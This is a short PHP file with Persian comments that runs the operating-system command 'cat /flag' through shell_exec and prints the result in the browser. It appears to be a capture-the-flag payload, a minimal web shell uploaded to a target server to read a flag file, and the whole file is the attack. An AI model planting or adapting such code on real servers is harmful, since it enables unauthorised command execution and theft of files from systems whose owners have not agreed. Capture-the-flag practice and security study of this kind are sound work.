<?php
// اجرای دستور سیستم عامل
$output = shell_exec('cat /flag');

// نمایش خروجی در مرورگر
echo "<pre>$output</pre>";
?>
